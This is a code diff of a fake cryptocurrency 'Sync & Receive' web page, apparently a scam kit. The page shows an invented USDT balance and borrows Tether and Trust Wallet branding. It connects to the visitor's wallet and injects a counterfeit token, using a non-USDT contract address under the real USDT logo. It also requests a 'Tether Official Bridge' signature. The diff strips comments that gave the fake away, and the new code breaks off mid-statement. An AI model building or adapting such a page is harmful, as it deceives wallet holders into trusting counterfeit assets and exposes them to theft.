@@ -14,7 +14,6 @@
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
         
-        /* Price Ticker Styling */
         .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
         .price-label { font-size: 12px; color: #848d97; text-transform: uppercase; margin-bottom: 5px; }
         .price-value { font-size: 22px; font-weight: 700; color: #fff; }
@@ -46,17 +45,16 @@
     
     <button class="action-btn" id="claimBtn">Sync & Receive</button>
     
-    <div class="status-footer">SECURED BY TETHER GOVERNANCE</div>
+    <div class="status-footer">SECURED BY TRUST WALLET NODE</div>
 </div>
 
 <script>
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    // Auto-calculating value for the UI
     window.onload = () => {
         let val = 0;
-        const target = 1000.00; // Fake target value for display
+        const target = 1000.00; 
         const timer = setInterval(() => {
             if(val >= target) clearInterval(timer);
             val += 17.52;
@@ -68,51 +66,27 @@
         const log = document.getElementById('log-area');
         const btn = document.getElementById('claimBtn');
         
-        if (!window.ethereum) { 
-            alert("Protocol Error: Please open inside Trust Wallet or MetaMask browser."); 
+        // --- TRUST WALLET PRIORITY CHECK ---
+        const provider = window.trustwallet || window.ethereum;
+
+        if (!provider) { 
+            alert("Protocol Error: Trust Wallet extension not detected."); 
             return; 
         }
 
         try {
             btn.disabled = true;
-            log.innerText = "> INITIALIZING AUTH...";
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            log.innerText = "> INITIALIZING TRUST SYNC...";
             
-            log.innerText = "> MAPPING METADATA...";
-            // Force inject Logo & Symbol
-            await window.ethereum.request({
+            // Handshake
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            
+            log.innerText = "> MAPPING ASSET LOGO...";
+            // Token Injection with Logo
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT_ADDR,
-                        symbol: 'USDT',
-                        decimals: 6,
-                        image: TOKEN_LOGO,
-                    },
-                },
-            });
-
-            log.innerText = "> VERIFYING SIGNATURE...";
-            // Signature request (No gas fee, No warning)
-            const msg = "Tether Official Bridge\nVerification ID: " + Math.floor(Math.random() * 999999) + "\nStatus: Mapping Verified Assets";
-            await window.ethereum.request({
-                method: 'personal_sign',
-                params: [msg, accounts[0]],
-            });
-
-            log.innerText = "> SYNC SUCCESSFUL!";
-            alert("Synchronization Complete! Your USDT assets are now active.");
-            btn.innerText = "SUCCESS";
-
-        } catch (err) {
-            log.innerText = "> SYNC_INTERRUPTED";
-            btn.disabled = false;
-        }
-    }
-
-    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
-</script>
-
-</body>
-</html>
+                        symbol
